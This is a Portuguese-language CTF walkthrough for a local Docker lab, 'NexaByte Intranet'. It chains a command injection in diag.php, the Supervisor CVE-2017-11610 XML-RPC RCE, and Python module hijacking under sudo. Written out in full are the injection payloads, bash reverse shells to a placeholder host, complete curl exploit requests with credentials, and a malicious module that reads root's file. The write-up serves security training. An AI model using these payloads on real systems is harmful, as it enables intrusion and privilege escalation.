# Walkthrough técnico - NexaByte Intranet CTF

Este documento descreve a solução completa do desafio, incluindo enumeração, acesso inicial, movimento lateral e escalação de privilégios.

## 1. Enumeração inicial

Com o ambiente em execução, identifique as portas expostas:

```bash
nmap -sV -p 8080,2222 localhost
```

Resultado esperado:

```text
8080/tcp open  http
2222/tcp open  ssh
```

Acesse a página inicial da intranet:

```bash
curl http://localhost:8080/
```

## 2. Enumeração web

Verifique o arquivo `robots.txt`:

```bash
curl http://localhost:8080/robots.txt
```

Conteúdo relevante:

```text
Disallow: /dev-notes.txt
```

Acesse as notas internas:

```bash
curl http://localhost:8080/dev-notes.txt
```

As notas indicam:

- `diag.php`, uma ferramenta interna de diagnóstico;
- `assets/old_config.bak`, um arquivo legado;
- um serviço Supervisor local usado pelo usuário junior;
- `/usr/local/bin/junior-report`, uma rotina executada como root no ambiente de homologação.

Leia o arquivo legado:

```bash
curl http://localhost:8080/assets/old_config.bak
```

Informações importantes:

```text
version=3.3.1
bind=127.0.0.1
port=9001
rpc_path=/RPC2
rpc_user=junior
rpc_password=junior123
```

## 3. Acesso inicial via command injection

O endpoint `/diag.php` concatena o parâmetro `host` diretamente em um comando shell:

```php
$output = shell_exec("ping -c 1 " . $host . " 2>&1");
```

Teste a injeção diretamente pela interface web:

1. Acesse `http://localhost:8080/diag.php`.
2. No campo `Host ou IP`, envie:

```bash
127.0.0.1 && id
```

O retorno da página deve mostrar o resultado do `ping` e, em seguida, a execução do comando `id` como o usuário `base`.

Para obter uma shell reversa, abra um listener na máquina atacante:

```bash
nc -lvnp 4444
```

Na interface do `diag.php`, preencha o campo `Host ou IP` com:

```bash
127.0.0.1; bash -c 'bash -i >& /dev/tcp/IP_DO_DOCKER/4444 0>&1'
```

Troque `IP_DO_DOCKER` pelo IP alcançável a partir do container. Em Linux com Docker bridge, normalmente é o IP da bridge do Compose, por exemplo `172.18.0.1` ou `172.19.0.1`.

Confirme a shell:

```bash
whoami
id
```

Resultado esperado:

```text
base
```

## 4. Movimento lateral via CVE-2017-11610

Na shell como `base`, enumere as portas locais:

```bash
ss -lntp
```

Resultado relevante:

```text
127.0.0.1:9001
```

Esse serviço não fica exposto externamente pelo Docker.

Combinando essa descoberta com as informações obtidas em `old_config.bak`, teste o endpoint XML-RPC:

```bash
curl -i http://127.0.0.1:9001/RPC2
```

O retorno esperado inclui:

```text
HTTP/1.0 501 Unsupported method ('GET')
Server: SupervisorXMLRPC/3.3.1 Python/...
```

Isso indica um serviço Supervisor XML-RPC antigo. O container instala o `supervisor==3.3.1`, versão real afetada pela CVE-2017-11610 quando a interface XML-RPC fica acessível a usuários autenticados.

Usando uma versão adaptada da PoC disponível no Exploit-DB, é possível acionar a cadeia `warnings.linecache.os.system` para executar comandos.

Teste a execução de comandos:

```bash
curl -s -u junior:junior123 -X POST http://127.0.0.1:9001/RPC2 \
  -H 'Content-Type: text/xml' \
  -d '<methodCall><methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName><params><param><value><string>id > /tmp/cve-id; chmod 644 /tmp/cve-id</string></value></param></params></methodCall>'

cat /tmp/cve-id
```

O comando deve executar como `operator`.

Abra outro listener na máquina atacante:

```bash
nc -lvnp 5555
```

Dispare uma shell reversa a partir do serviço vulnerável:

```bash
curl -s -u junior:junior123 -X POST http://127.0.0.1:9001/RPC2 \
  -H 'Content-Type: text/xml' \
  -d '<methodCall><methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName><params><param><value><string><![CDATA[bash -c "bash -i >& /dev/tcp/IP_DO_DOCKER/5555 0>&1"]]></string></value></param></params></methodCall>'
```

Na nova shell, confirme o usuário:

```bash
whoami
id
```

Resultado esperado:

```text
operator
```

## 5. User flag

Como `operator`, leia a user flag:

```bash
cat /home/operator/user.txt
```

Flag esperada:

```text
NEXA{user_flag :)}
```

## 6. Enumeração local para escalação

Verifique as permissões de `sudo`:

```bash
sudo -l
```

Resultado esperado:

```text
(root) NOPASSWD: /usr/local/bin/junior-report
```

Inspecione a rotina autorizada:

```bash
cat /usr/local/bin/junior-report
cat /opt/junior-report/junior_report.py
ls -ld /opt/junior-report
```

Pontos importantes:

- `/usr/local/bin/junior-report` executa `junior_report.py` como root;
- `junior_report.py` importa o módulo `report_utils`;
- `/opt/junior-report` é gravável pelo grupo `operator`;
- não existe um `report_utils.py` confiável no diretório.

Isso permite Python module hijacking: o atacante pode criar um módulo `report_utils.py` malicioso no diretório em que o script será executado.

## 7. Escalação via Python module hijacking

Crie um módulo malicioso:

```bash
cat > /opt/junior-report/report_utils.py <<'EOF'
import os

def collect():
    os.system("cp /root/root.txt /tmp/root.txt && chmod 644 /tmp/root.txt")
EOF
```

Execute a rotina autorizada pelo `sudo`:

```bash
sudo /usr/local/bin/junior-report
```

Leia a root flag:

```bash
cat /tmp/root.txt
```

Flag esperada:

```text
NEXA{root_flag :D}
```

## 8. Referências da CVE-2017-11610

- NVD: https://nvd.nist.gov/vuln/detail/CVE-2017-11610
- Exploit-DB 42779, referenciado pela NVD: https://www.exploit-db.com/exploits/42779/
- Vulhub: https://github.com/vulhub/vulhub/tree/master/supervisor/CVE-2017-11610
- Análise técnica original usada como base para a cadeia `warnings.linecache.os.system`: https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html
- Módulo Metasploit `supervisor_xmlrpc_exec`: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/supervisor_xmlrpc_exec.rb
